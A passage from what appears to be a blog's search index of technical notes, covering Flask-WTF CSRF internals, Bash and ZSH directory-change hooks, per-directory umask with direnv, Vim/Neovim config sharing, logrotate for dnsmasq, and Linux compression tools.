utils.login_required装饰路由：检测是否认证登录current_user.is_authenticated。若未认证，触发LoginManager.unauthorized()，根据.login_view跳转至登录URL进行认证，且会调用flash()生成认证消息提示。（通常，认证路由调用login_user登录用户，其实为记录用户id到session，装载用户实例到_request_ctx_stack.top.user）\n期间还涉及session新鲜度，以及session强度等问题。由于此处只是流程梳理，不做详细解释。\n","permalink":"https://blog.pseudocold.com/post/2019/flask-login-code-reading/","tags":["flask"],"title":"Flask-Login 源码阅读笔记"},{"categories":["Code Reading"],"contents":"flask-wtf 源码阅读个人笔记， 不做解读。\nFlask-WTF 基于 WTForm\n 支持csrf_token生成与校验(meta.csrf表单项控制开关，默认开启) 自动填充request.form到FlaskForm实例，重写wtforms.Form元类方法wrap_formdata()实现 form.validate_on_submit()，只在提交(POST等)后校验，免去手动判断提交方式  csrf 功能为 wtforms 内置，Flask-WTF 做了适当的修改\n FlaskForm自动添加隐藏字段 csrf_token 自定义 CSRF token 生成与验证  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  flask_wtf ├── recaptcha │ ├── __init__.py │ ├── fields.py │ ├── validators.py │ └── widgets.py ├── __init__.py ├── _compat.py ├── csrf.py ├── file.py ├── form.py ├── html5.py └── i18n.py 1 directory, 11 files   _compat.py 0.14.2\nurlparse兼容引入 1 2 3 4 5 6 7 8  if not PY2: text_type = str string_types = (str,) from urllib.parse import urlparse else: text_type = unicode string_types = (str, unicode) from urlparse import urlparse   其实也可以使用werkzeug.urls.url_parse, 兼容Py 2、3的封装。\ncsrf.py 0.14.2\n生成、验证 generate_csrf, validate_csrf.\n1 2 3 4 5 6 7 8 9 10  def generate_csrf(secret_key=None, token_key=None): # ... if field_name not in g: if field_name not in session: session[field_name] = hashlib.sha1(os.urandom(64)).hexdigest() s = URLSafeTimedSerializer(secret_key, salt=\u0026#39;wtf-csrf-token\u0026#39;) setattr(g, field_name, s.dumps(session[field_name])) return g.get(field_name)   generate random string with urandom(64) and hashlib.sha1. dump it with URLSafeTimedSerializer, the result of which is used as csrf-token.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  from itsdangerous import BadData, SignatureExpired, URLSafeTimedSerializer from werkzeug.security import safe_str_cmp from wtforms import ValidationError def validate_csrf(data, secret_key=None, time_limit=None, token_key=None): # ... if not data: raise ValidationError(\u0026#39;The CSRF token is missing.\u0026#39;) if field_name not in session: raise ValidationError(\u0026#39;The CSRF session token is missing.\u0026#39;) s = URLSafeTimedSerializer(secret_key, salt=\u0026#39;wtf-csrf-token\u0026#39;) try: token = s.loads(data, max_age=time_limit) except SignatureExpired: raise ValidationError(\u0026#39;The CSRF token has expired.\u0026#39;) except BadData: raise ValidationError(\u0026#39;The CSRF token is invalid.\u0026#39;) if not safe_str_cmp(session[field_name], token): raise ValidationError(\u0026#39;The CSRF tokens do not match.\u0026#39;)   注意Serializer验证错误中的不同错误类型，参考使用到用户密码重置token验证。\n_FlaskFormCSRF 1 2 3 4 5 6 7 8 9 10 11  from wtforms.csrf.core import CSRF class _FlaskFormCSRF(CSRF): # ... def generate_csrf_token(self, csrf_token_field): return generate_csrf( secret_key=self.meta.csrf_secret, token_key=self.meta.csrf_field_name ) def validate_csrf_token(self, form, field): pass   添加表单中csrf_token字段的生成，校验。FlaskForm类中通过元类添加此_FlaskFormCSRF。从而引入csrf_token。\nCSRFProtect class FlaskForm默认渲染csrf_token字段，且form.validate_on_submit()进行csrf token校验。CSRFProtect开启主要针对没有form提交的路由，例如异步AJAX请求，的校验。\n手动生成csrf token方法\n1 2 3 4 5 6 7 8 9  from flask_wtf.csrf import generate_csrf from flask import app, render_template_string app=Flask(__name__) with app.app_context(): render_template_string(\u0026#39;{{ csrf_token }}\u0026#39;) # or generate_csrf()   render_template_string('{{ csrf_token }}')，实际是通过FlaskForm类调用_FlaskFormCSRF(CSRF)类，后者调用generate_csrf(secret_key=None, token_key=None)。只不过，这样调用的过程中，可以在表单初始化传递对应参数。默认使用配置WTF_CSRF_SECRET_KEY, WTF_CSRF_FIELD_NAME。\ncsrf_token会缓存到应用上下文对象g中，默认为g.get('csrf_token')。\nNote: _get_csrf_token()检查当前请求带有的csrf_token。一是从request.form中获取WTF_CSRF_FIELD_NAME='csrf_token字段；二是从request.headers字典中获取WTF_CSRF_HEADERS=['X-CSRFToken', 'X-CSRF-Token']请求头。\n1 2  app = Flask(__name__) csrf = CsrfProtect(app)   绑定CSRFProtect到扩展。app.extensions['csrf'] = self\n加载配置，回落到默认配置。\n装载上下文csrf_token为函数generate_csrf\n1 2  app.jinja_env.globals[\u0026#39;csrf_token\u0026#39;] = generate_csrf app.context_processor(lambda: {\u0026#39;csrf_token\u0026#39;: generate_csrf})   注册csrf_protect()到请求钩子@app.before_request. csrf_protect()调用protect()，protect()验证csrf_token validate_csrf(self._get_csrf_token())。标记请求CSRF valid，g.csrf_valid = True.\nCSRFError 错误，参考文档自定义跳转到错误提示页面。\n1 2 3 4 5  from flask_wtf.csrf import CSRFError @app.errorhandler(CSRFError) def handle_csrf_error(e): return render_template(\u0026#39;csrf_error.html\u0026#39;, reason=e.description), 400   判断URL同源 same_origin\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  if request.is_secure and current_app.config[\u0026#39;WTF_CSRF_SSL_STRICT\u0026#39;]: if not request.referrer: self._error_response(\u0026#39;The referrer header is missing.\u0026#39;) good_referrer = \u0026#39;https://{0}/\u0026#39;.format(request.host) if not same_origin(request.referrer, good_referrer): self._error_response(\u0026#39;The referrer does not match the host.\u0026#39;) # ... def same_origin(current_uri, compare_uri): current = urlparse(current_uri) compare = urlparse(compare_uri) return ( current.scheme == compare.scheme and current.hostname == compare.hostname and current.port == compare.port )   form.py 0.14.2\nFlaskForm子类，继承自wtforms.Form\n 修改默认元类wrap_formdata方法，实现自动填充request到form实例 i18n支持 自动生成csrf token，meta.csrf控制开关 form.validate_on_submit仅在提交表单时触发验证  csrf_token字段的生成实际由wtforms.meta.DefaultMeta和flask_wtf.csrf._FlaskFormMeta决定。前者内置了CSRF字段判断、生成。后者提供了自定义的token生成方法和校验方法。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48  from .csrf import _FlaskFormCSRF SUBMIT_METHODS = set((\u0026#39;POST\u0026#39;, \u0026#39;PUT\u0026#39;, \u0026#39;PATCH\u0026#39;, \u0026#39;DELETE\u0026#39;)) _Auto = object() class FlaskForm(Form): class Meta(DefaultMeta): csrf_class = _FlaskFormCSRF # csrf_token 处理类 csrf_context = session # not used, provided for custom csrf_class # ... def wrap_formdata(self, form, formdata): # 如果form对象没有数据 if formdata is _Auto: # 如果提交了表单，提交方式为POST、PUT等，从request获取表单数据填充 if _is_submitted(): if request.files: return CombinedMultiDict(( request.files, request.form )) elif request.form: return request.form elif request.get_json(): return ImmutableMultiDict(request.get_json()) return None return formdata def __init__(self, formdata=_Auto, **kwargs): csrf_enabled = kwargs.pop(\u0026#39;csrf_enabled\u0026#39;, None) if csrf_enabled is not None: warnings.warn(FlaskWTFDeprecationWarning( \u0026#39;\u0026#34;csrf_enabled\u0026#34; is deprecated and will be removed in 1.0. \u0026#39; \u0026#39;Set \u0026#34;meta.csrf\u0026#34; instead.\u0026#39; ), stacklevel=3) kwargs[\u0026#39;meta\u0026#39;] = kwargs.get(\u0026#39;meta\u0026#39;) or {} kwargs[\u0026#39;meta\u0026#39;].setdefault(\u0026#39;csrf\u0026#39;, csrf_enabled) super(FlaskForm, self).__init__(formdata=formdata, **kwargs) # ... def validate_on_submit(self): \u0026#34;\u0026#34;\u0026#34;Call :meth:`validate` only if the form is submitted. This is a shortcut for ``form.is_submitted() and form.validate()``. \u0026#34;\u0026#34;\u0026#34; return self.is_submitted() and self.validate()   wtforms.meta, wtforms.form and csrf_token 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  # wtform.meta class DefaultMeta(object): # ... # -- CSRF csrf = False csrf_field_name = \u0026#39;csrf_token\u0026#39; csrf_secret = None csrf_context = None csrf_class = None def build_csrf(self, form): \u0026#34;\u0026#34;\u0026#34; Build a CSRF implementation. This is called once per form instance. The default implementation builds the class referenced to by :attr:`csrf_class` with zero arguments. If `csrf_class` is ``None``, will instead use the default implementation :class:`wtforms.csrf.session.SessionCSRF`. :param form: The form. :return: A CSRF implementation. \u0026#34;\u0026#34;\u0026#34; if self.csrf_class is not None: # FlaskForm, flask_wtf.csrf._FlaskFormMeta 提供 return self.csrf_class() from wtforms.csrf.session import SessionCSRF return SessionCSRF()   1 2 3 4 5 6 7 8 9 10 11 12 13 14  # wtforms.form class BaseForm(object): \u0026#34;\u0026#34;\u0026#34; Base Form Class. Provides core behaviour like field construction, validation, and data and error proxying. \u0026#34;\u0026#34;\u0026#34; def __init__(self, fields, prefix=\u0026#39;\u0026#39;, meta=DefaultMeta()): # ... self.meta = meta # ... if meta.csrf: self._csrf = meta.build_csrf(self) # build field csrf_token extra_fields.extend(self._csrf.setup_form(self))   最终，flask_wtf.csrf._FlaskFormMeta中generate_csrf_token()，在wtforms.core.CSRFTokenField下process()被调用。实际为Form.__init__调用各字段的process()函数。\n总之，csrf 功能 wtforms 内置，Flask-WTF 做了适当的修改\n 命名字段 csrf_token 自定义 CSRF token 生成与验证  file.py 0.14.2\nFileField继承自wtforms.fields.FileField.\nFile Upload usage from doc\n The FileField provided by Flask-WTF differs from the WTForms-provided field. It will check that the file is a non-empty instance of FileStorage, otherwise data will be None.\n 新验证方法，FileRequired()(synonym file_required), FileAllowed() (file_allowed).\n","permalink":"https://blog.pseudocold.com/post/2019/flask-wtf-code-reading/","tags":["flask"],"title":"Flask-WTF 源码阅读笔记"},{"categories":["CLI"],"contents":"Implement a chpwd hook in Bash to trigger functions on working dir changes.\nThere\u0026rsquo;s not a complete hook system designed in Bash when compared with other modern shells. PROMPT_COMMAND variable is used as a hook in Bash, which is equivalent to precmd hook in ZSH, fish_prompt in Fish. For the time being, ZSH is the only shell I\u0026rsquo;ve known that has a chpwd hook builtin.\n PROMPT_COMMAND\nIf set, the value is interpreted as a command to execute before the printing of each primary prompt ($PS1).\nhttps://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html#Bash-Variables\n chpwd Hook in Bash To achieve this in Bash, a trick is provided here to setup a chpwd equivalent hook in Bash based on PROMPT_COMMAND.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  # create a PROPMT_COMMAND equivalent to store chpwd functions typeset -g CHPWD_COMMAND=\u0026#34;\u0026#34; _chpwd_hook() { shopt -s nullglob local f # run commands in CHPWD_COMMAND variable on dir change if [[ \u0026#34;$PREVPWD\u0026#34; != \u0026#34;$PWD\u0026#34; ]]; then local IFS=$\u0026#39;;\u0026#39; for f in $CHPWD_COMMAND; do \u0026#34;$f\u0026#34; done unset IFS fi # refresh last working dir record export PREVPWD=\u0026#34;$PWD\u0026#34; } # add `;` after _chpwd_hook if PROMPT_COMMAND is not empty PROMPT_COMMAND=\u0026#34;_chpwd_hook${PROMPT_COMMAND:+;$PROMPT_COMMAND}\u0026#34;   Since we\u0026rsquo;re detecting PWD change directly, the solution works with cd, pushd, and popd.\nNote: The main difference between our chpwd implementation in Bash and the chpwd in ZSH is, PROMPT_COMMAND is not supported in a non-interactive Bash shell.\nUsage 1 2 3 4 5 6 7 8 9 10  # example 1: `ls` list directory once dir is changed _ls_on_cwd_change() { ls } # append the command into CHPWD_COMMAND CHPWD_COMMAND=\u0026#34;${CHPWD_COMMAND:+$CHPWD_COMMAND;}_ls_on_cwd_change\u0026#34; # or just use `ls` directly CHPWD_COMMAND=\u0026#34;${CHPWD_COMMAND:+$CHPWD_COMMAND;}ls\u0026#34;   ","permalink":"https://blog.pseudocold.com/post/2019/chpwd-equivalent-in-bash/","tags":["bash"],"title":"Implement a Custom chpwd Hook for Bash"},{"categories":["CLI"],"contents":"By default, ZSH hook chpwd is not triggered on shell startup. The tutorial here provides some ideas to fix this.\nTrigger all chpwd_functions on startup We can use a trick to define a function run only once on precmd and destruct itself automatically.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  function _self_destruct_hook { local f for f in ${chpwd_functions}; do \u0026#34;$f\u0026#34; done # remove self from precmd precmd_functions=(${(@)precmd_functions:#_self_destruct_hook}) builtin unfunction _self_destruct_hook } # prepend the hook, in case you want run the hook 1st precmd_functions=(_self_destruct_hook ${precmd_functions[@]}) # or append the hook (( $+functions[add-zsh-hook] )) || autoload -Uz add-zsh-hook add-zsh-hook precmd _self_destruct_hook   The _self_destruct_hook wraps chpwd_functions and run every item within once on precmd/startup.\nTrigger specific chpwd_functions on startup Unlike the method above, the following change makes it possible to run specific item from chpwd_functions.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  # define an array to collect functions run only once typeset -ag self_destruct_functions=() function _self_destruct_hook { local f for f in ${self_destruct_functions}; do \u0026#34;$f\u0026#34; done # remove self from precmd precmd_functions=(${(@)precmd_functions:#_self_destruct_hook}) builtin unfunction _self_destruct_hook unset self_destruct_functions } precmd_functions=(_self_destruct_hook ${precmd_functions[@]}) # example 1: hook direnv on chpwd and run it on startup/precmd once if (( $+commands[direnv] )) \u0026amp;\u0026amp; ! (( $+functions[_direnv_hook] )); then _direnv_hook() { eval \u0026#34;$(command \u0026#34;direnv\u0026#34; export zsh)\u0026#34;; } typeset -ag chpwd_functions chpwd_functions=(_direnv_hook ${chpwd_functions[@]}) # add the _direnv_hook into custom _self_destruct_hook # prepend _direnv_hook cause we need env var changes before any other action self_destruct_functions=(_direnv_hook ${self_destruct_functions[@]}) fi # example 2: dynamic umask with direnv function _umask_hook { if [[ -n $UMASK ]]; then umask \u0026#34;$UMASK\u0026#34; elif [[ $OSTYPE == darwin* ]]; then umask 0077 else umask 0022 fi } add-zsh-hook chpwd _umask_hook # run _umask_hook once on shell startup # append _umask_hook to make sure env var change made by direnv is triggered 1st self_destruct_functions=(${self_destruct_functions[@]} _umask_hook)   Credit The self-destruct function is borrowed from robobenklein/zinc the ZSH prompt.\n","permalink":"https://blog.pseudocold.com/post/2019/trigger-chpwd-on-zsh-startup/","tags":["zsh"],"title":"Trigger chpwd hook on ZSH startup"},{"categories":["CLI"],"contents":"Set umask values per-directory.\nDefault umaks on macOS is 0077, which is different with most Linux distributions.\nThere\u0026rsquo;re pros and cons about this very decision made by Apple. For the good part, temporary files generate under /tmp, $TMPDIR are accessible by the user himself only. These locations could be alternatives to $XDG_RUNTIME_DIR.\nWhile, the problem is that since the new files are accessible by yourself only, it\u0026rsquo;s inconvenient to share files with other users.\nIt\u0026rsquo;s easy to change umask globally with a LauchAgent, or change it for shells only in the shell initialization files. But the solution I provide is more flexible, the umask is set per-directory with the help of direnv.\nThe solution is based on zimbatm\u0026rsquo;s answer from direnv issue #509.\nI improved zimbatm\u0026rsquo;s code for macOS, where the default umask value is 0077.\nDynamic umask with direnv and custom hook 1 2  # example .envrc file export UMASK=0022   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  function _umask_hook { if [[ -n $UMASK ]]; then umask \u0026#34;$UMASK\u0026#34; elif [[ $OSTYPE == darwin* ]]; then umask 0077 else umask 0022 fi } # To make the code more reliable on detecting the default umask function _umask_hook { # Record the default umask value on the 1st run [[ -z $DEFAULT_UMASK ]] \u0026amp;\u0026amp; export DEFAULT_UMASK=\u0026#34;$(builtin umask)\u0026#34; if [[ -n $UMASK ]]; then umask \u0026#34;$UMASK\u0026#34; else umask \u0026#34;$DEFAULT_UMASK\u0026#34; fi } # zsh hooks # trigger _umask_hook once working dir is changed # precmd is not enough, cause it may not be triggered when cwd is changed by ZLE widget add-zsh-hook chpwd _umask_hook # make sure _umask_hook is run on startup add-zsh-hook precmd _umask_hook # bash # Append `;` if PROMPT_COMMAND is not empty PROMPT_COMMAND=\u0026#34;${PROMPT_COMMAND:+$PROMPT_COMMAND;}_umask_hook\u0026#34;   Hook direnv onto chpwd For the time being, direnv hook initialization for zsh doesn\u0026rsquo;t support chpwd hook. If the pull request GH-514 has not been merged when you see this page. Please comment out eval \u0026quot;$(direnv hook zsh)\u0026quot; and hook direnv on chpwd manually with following code,\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  if (( $+commands[direnv] )) \u0026amp;\u0026amp; ! (( $+functions[_direnv_hook] )); then _direnv_hook() { eval \u0026#34;$(command \u0026#34;direnv\u0026#34; export zsh)\u0026#34;; } typeset -agU precmd_functions; if [[ -z ${precmd_functions[(r)_direnv_hook]} ]]; then precmd_functions=( _direnv_hook ${precmd_functions[@]} ) fi typeset -agU chpwd_functions; if [[ -z ${chpwd_functions[(r)_direnv_hook]} ]]; then chpwd_functions=( _direnv_hook ${chpwd_functions[@]} ) fi fi   Trigger chpwd on shell startup In fact, adding _umaks_hook, _direnv_hook into precmd is redundant, cause hooking them onto chpwd is enough. The only problem is that, chpwd is not run on shell startup. A solution is here: Trigger chpwd Hook on Startup.\n chpwd\nExecuted whenever the current working directory is changed.\n  precmd\nExecuted before each prompt. Note that precommand functions are not re-executed simply because the command line is redrawn, as happens, for example, when a notification about an exiting job is displayed.\n References  direnv ","permalink":"https://blog.pseudocold.com/post/2019/dynamic-umask-based-on-cwd/","tags":["zsh","direnv","umask"],"title":"Dynamic Umask Based on Current Working Directory"},{"categories":["CLI"],"contents":"Share configuration files between vim and nvim.\nThe post was created for the question How to share config between vim and Neovim.\nIn this solution, we try to symlink ~/.config/nvim to ~/.vim, and make the conf compatible with vim.\n1 2 3 4 5 6 7 8 9  # nvim conf dir: ~/.config/nvim # vim conf dir: ~/.vim # link the 1st as the 2nd with relative links # Prepare a vimrc file in ~/.config/nvim folder ln -sf ./init.vim ~/.config/nvim/vimrc # Link the whole ~/.config/nvim folder as ~/.vim foler ln -sf ./.config/nvim ~/.vim   After this setup, ~/.config/nvim/init.vim is the real file used as conf. ~/.vim/vimrc is just a link to it.\nNow we need to make vim reuse nvim\u0026rsquo;s plugin manager, plugins, by changing runtimepath and packpath. In fact, the plugin paths are reused automatically, the following fix is reusing the plugin manger.\n1 2 3 4 5 6 7 8 9 10 11  let g:is_nvim = has(\u0026#39;nvim\u0026#39;)let g:is_vim8 = v:version \u0026gt;= 800 ? 1 : 0\u0026#34; Reuse nvim\u0026#39;s runtimepath and packpath in vimif !g:is_nvim \u0026amp;\u0026amp; g:is_vim8 set runtimepath-=~/.vim \\ runtimepath^=~/.local/share/nvim/site runtimepath^=~/.vim \\ runtimepath-=~/.vim/after \\ runtimepath+=~/.local/share/nvim/site/after runtimepath+=~/.vim/after let \u0026amp;packpath = \u0026amp;runtimepathendif  ","permalink":"https://blog.pseudocold.com/post/2019/share-conf-between-vim-and-nvim/","tags":["vim","neovim"],"title":"Share Configuration Files between Vim and Neovim"},{"categories":["CLI"],"contents":"Check whether a command exists using ZSH.\nThe main purpose is to determine whether a command exists in PATH. Some of the following methods also support determine the existence of functions. The comparison focuses on speed, not support coverage.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  ❯ export TIMEFMT=$\u0026#39;%U user %S system %P cpu %*E total\u0026#39; ❯ time (for i ({1..100}) if (($+commands[tree])); then echo 1 \u0026amp;\u0026gt;/dev/null; fi) 0.00s user 0.00s system 89% cpu 0.006 total ❯ time (for i ({1..100}) if hash tree \u0026amp;\u0026gt;/dev/null; then echo 1 \u0026amp;\u0026gt;/dev/null; fi) 0.00s user 0.00s system 92% cpu 0.007 total ❯ time (for i ({1..100}) if command -v tree \u0026amp;\u0026gt;/dev/null; then echo 1 \u0026amp;\u0026gt;/dev/null; fi) 0.00s user 0.00s system 95% cpu 0.010 total ❯ time (for i ({1..100}) if whence -p tree \u0026amp;\u0026gt;/dev/null; then echo 1 \u0026amp;\u0026gt;/dev/null; fi) 0.00s user 0.01s system 94% cpu 0.010 total ❯ time (for i ({1..100}) if type tree \u0026amp;\u0026gt;/dev/null; then echo 1 \u0026amp;\u0026gt;/dev/null; fi) 0.01s user 0.01s system 97% cpu 0.019 total ❯ time (for i ({1..100}) if which -a tree \u0026amp;\u0026gt;/dev/null; then echo 1 \u0026amp;\u0026gt;/dev/null; fi) 0.01s user 0.01s system 97% cpu 0.021 total   Note: which is a builtin in ZSH, not the external command /usr/bin/which.\nWhat does the + do in $+commands[…]?\n ${+name}\nIf name is the name of a set parameter ‘1’ is substituted, otherwise ‘0’ is substituted.\n References  How can I determine whether a command exists anywhere in my PATH? ","permalink":"https://blog.pseudocold.com/post/2019/whether-a-command-exists-in-zsh/","tags":["zsh"],"title":"Determine Whether a Command Exists in ZSH"},{"categories":["DevOps"],"contents":"logrotate 切割日志使用方法，以及以 dnsmasq 为例切割非 root 拥有的日志。\nlogrotate 默认方式为移动原日志，创建一个新日志（默认以 root:root 用户、组）。\nlogrotate runs daily using a systemd timer: logrotate.timer. logrotate 是以 systemd/timer 触发，需要激活 timer，而非 service。\nUsage Examples from man logrotate.conf.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  # sample logrotate configuration file compress /var/log/messages { rotate 5 weekly postrotate /usr/bin/killall -HUP syslogd endscript } \u0026#34;/var/log/httpd/access.log\u0026#34; /var/log/httpd/error.log { rotate 5 mail recipient@example.org size 100k sharedscripts postrotate /usr/bin/killall -HUP httpd endscript } /var/log/news/* { monthly rotate 2 olddir /var/log/news/old missingok postrotate kill -HUP $(cat /var/run/inn.pid) endscript nocompress } ~/log/*.log {}   /etc/logrotate.d/nginx\n1 2 3 4 5 6 7 8 9 10 11 12 13  /var/log/nginx/*.log { daily missingok rotate 52 compress delaycompress notifempty create 640 nginx adm sharedscripts postrotate [ -f /var/run/nginx.pid ] \u0026amp;\u0026amp; kill -USR1 `cat /var/run/nginx.pid` endscript }   Useful Options create perm user group, or create user group. 新建日志文件的权限。\ncopytruncate, make a copy and clean content of the current log file. Useful for programs could not be told to close the file.\ndateext，为备份文件添加时间戳后缀。默认 -%Y%m%d, hourly uses -%Y%m%d%H.\nmail mail when log is rotated out of existence.\npostrotate/endscript script is execute with /bin/sh. (sh is not bash)\nExample: rotate log for dnsmasq 网上搜到的几个脑残写法都是错的，关键在于 dnsmasq 不是以 root 运行。日志文件重建时要使用正确的权限。\nman dnsmasq\n -u, --user=\u0026lt;username\u0026gt;\nSpecify the userid to which dnsmasq will change after startup. Dnsmasq must normally be started as root, but it will drop root privileges after startup by changing id to another user. Nor‐ mally this user is nobody but that can be over-ridden with this switch.\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  # /etc/logrotate.d/dnsmasq /var/log/dnsmasq.log { rotate 14 # logrotate removes the log file and create a new one by default # you can also try alternative copytruncate # For dnsmasq, it\u0026#39;s started as root but drop priveleges and run by nobody by default create 0660 nobody root # daily weekly missingok notifempty # compress # delay compression to the next rotation cycle delaycompress # date extension: -%Y%m%d, but -%Y%m%d for hourly dateext nomail # run script only once no matter how many files match wildcard patterns sharedscripts postrotate # [ -f /var/run/dnsmasq.pid ] \u0026amp;\u0026amp; kill -USR2 `cat /var/run/dnsmasq.pid` ] # For dnsmasq daemon integrated with NetworkManager [ -f /var/run/NetworkManager/dnsmasq.pid ] \u0026amp;\u0026amp; kill -USR2 `cat /var/run/NetworkManager/dnsmasq.pid` endscript }   create 0660 nobody root 保证了新建的日志文件可被 dnsmasq 进程读写。kill -USR2 发送信号告知 dnsmasq 重新打开日志文件。SIGUSR2 使用见 man dnsmasq，这点是有程序自己定义的。\nCommand Line Usage 主要用来测试运行。\n1 2 3 4 5 6 7 8 9 10 11  # rotate now manually logrotate /etc/logrotate.conf # rotate a single log file logrotate /etc/logrotate.d/mylog # simulate, dry run logrotate --debug /etc/logratate.d/mylog # force runing even the condition is not met logrotate -vf /etc/logrotate.d/mylog   Status Check /var/lib/logrotate.status，logrotate 运行状态日志。\nReferences  man logrotate Log Rotate from loggly.com ","permalink":"https://blog.pseudocold.com/post/2019/logrotate/","tags":["linux","logrotate"],"title":"在 Linux 上利用 Logrotate 切割日志"},{"categories":["DevOps","Notes","CLI"],"contents":"在命令行里该用什么命令解压什么文件？压缩命令使用总结。个人笔记，非入门教程。\n压缩格式不重要，关键是其使用了什么压缩算法。\nTODO\n cpio 使用场景  工具选择建议  分享Linux文件最好使用 tar 包，可以保留文件权限（默认不拷贝 attrs, xattr） p7zip 用来解压各种格式，以及压缩 7z 格式。支持解压 rar 压缩包。  可替代 unzip，unrar   zip encoding，由于压缩包没有记录编码，需要工具支持自定编码参数  unzip-iconv，-O, -I. Ubuntu 已经使用了此patch. macOS 直接使用 unar unarchiver on Linux, unar on macOS, urar -e gb18030. (此包只支持解压) iconv and convmv   配合 atool 避免记忆压缩、解压参数 pv for progress in case you use custom compresion options in tar  Compress .Z compress压缩。已退出历史舞台\ngzip, bzip2, xz gzip 支持解开 compress，zip，gzip 压缩文件\ngzip 命令压缩、解压后默认删除原来文件\nzcat/zmore/zless/zgrep 一系列工具\nbzip2 默认不会删除原来文件需要显式使用 -k 参数。\ntarball tar 压缩，-z gzip, -j bzip2, -J xz\n -p，保留权限与属性 -P，保留绝对路径。默认移除开头/ 解压部分文件 tar -jxv -f /root/etc.tar.bz2 etc/shadow  对压入的文件筛选\n1  tar -jcv -f /root/etc.newer.then.passwd.tar.bz2 --newer-mtime=\u0026#34;2015/06/17\u0026#34; /etc/*   /var/spool/mail/ (系統中，所有帳號的郵件信箱)\n/var/spool/cron/ (所有帳號的工作排成設定檔)\n1 2 3  tar -jcv -f /backups/backup-system-20150701.tar.bz2 \\  --exclude=/root/*.bz2 --exclude=/root/*.gz --exclude=/home/loop* \\  /etc /home /var/spool/mail /var/spool/cron /root   tar -a 自动猜测压缩格式进行解压。\nbsdtar v.s. gnutar While BSD tar recognizes compression formats based on the format, GNU tar only guesses based on the file extension.\nBSD tar包名为 libarchive。命令名为 bsdtar。\ntar 自定义调用的压缩算法 tar 调用自定义压缩\nHow to use Pigz with Tar\n1 2 3 4 5 6 7 8  # 调用 --use-compress-program tar --use-compress-program=\u0026#34;pigz --best --recursive\u0026#34; -cf archive.tar.gz YourData # monitor progress with pv tar --use-compress-program=\u0026#34;pigz --best --recursive | pv\u0026#34; -cf archive.tar.gz YourData # use - for stdin, stdout tar cf - paths-to-archive | pigz -9 -p 32 \u0026gt; archive.tar.gz   修复SELinux tar -p 保存了 SELinux 信息。\nTo set SELinux permissive, modify /etc/selinux/config.\n1 2  # 修复对应文件SELinux restorecon -Rv /etc   ISO mkisofs 创建 ISO 文件，一般不用，随用随查。\nisoinfo命令查看 ISO 文件信息。\nwodim 烧录 ISO 到光盘\ndd dd，基于扇区拷贝\n1  dd if=\u0026#34;input_file\u0026#34; of=\u0026#34;output_file\u0026#34; bs=\u0026#34;block_size\u0026#34; count=\u0026#34;number\u0026#34;   如果是拷贝整个分区，也会复制 UUID，还原到其他机器最好重新分配一个新 UUID，以避免重复。\ncpio copy IO\ncpio，操作标准输入、输出。不能直接传递文件名。随用随查。优势、使用场景是什么？\n其他 压缩算法 注意压缩算法。xz GNU实现的LZMA压缩。\np7zip 实现了多种压缩，LZMA2（加入多线程），不支持保存Linux文件权限。\n gzip, Burrows–Wheeler algorithm bzip2, DEFLATE xz, LZMA 7zip, LZMA2, etc  Fuck rar unrar is rar official app, not open sourced.\nunar is command from unarchiver pkg, with support for more than 40 archive formats. 仅支持解压和查看。\n1  7z x abc.rar   7z p7zip from arch wiki\n7z 不支持保留文件权限，不要用来备份\n 7z command, uses plugins to handle archives 7za, standalone executable handling fewer archive formats 7zr, standalone executable. only handles 7z archives, no encryption support  1 2 3 4 5 6 7 8 9 10 11 12 13 14  pacman -S p7zip # archive 7z a \u0026lt;archive name\u0026gt; \u0026lt;file name\u0026gt; # -p, password # -mhe=on, hide structure of the archive 7z a \u0026lt;archive name\u0026gt; \u0026lt;file name\u0026gt; -p -mhe=on # update existing archive 7z u \u0026lt;archive name\u0026gt; \u0026lt;filename\u0026gt; # list content of the archive 7z l \u0026lt;archive name\u0026gt;   Extract\n1 2 3 4 5 6 7 8  # extract to current dir 7z e \u0026lt;archive name\u0026gt; # extract with full paths 7z x \u0026lt;archive name\u0026gt; # extract to specific folder 7z x -o\u0026lt;foldername\u0026gt; \u0026lt;archive name\u0026gt;   Check integrity\n1  7z t \u0026lt;archive name\u0026gt;   并行压缩 GNU 实现的gzip，bzip2，xz均不支持并行。可以使用对应并行包进行压缩，解压不受影响。（参考archlinux wiki查看对应并行方案）\n pigz replaces gzip libzip2 or pbzip2 replaces bzip2 pixz, pxz replaces xz  ZIP wrong encoding Decompress ZIP with given encoding\n linux, `unzip-iconv, Ubuntu 默认已经使用了此patch版本 unarchive, unrar -e gb18030  1  yay -S unzip-iconv   1 2 3 4 5 6  $ unzip -h UnZip 6.00 of 20 April 2009, by Debian. Original by Info-ZIP. ... -O CHARSET specify a character encoding for DOS, Windows and OS/2 archives -I CHARSET specify a character encoding for UNIX and other archives ...   1 2 3  unzip -O \u0026lt;encoding\u0026gt; \u0026lt;filename\u0026gt; -d \u0026lt;target_dir\u0026gt; unzip -I \u0026lt;encoding\u0026gt; \u0026lt;filename\u0026gt; -d \u0026lt;target_dir\u0026gt;   1  unar -e gb18030 gb18030.zip   或者先直接解压，解压后做编码转换\nReferences  archiving and compression from archlinux wiki Decompress ZIP with given encoding 鸟哥私房菜：第八章 壓縮指令 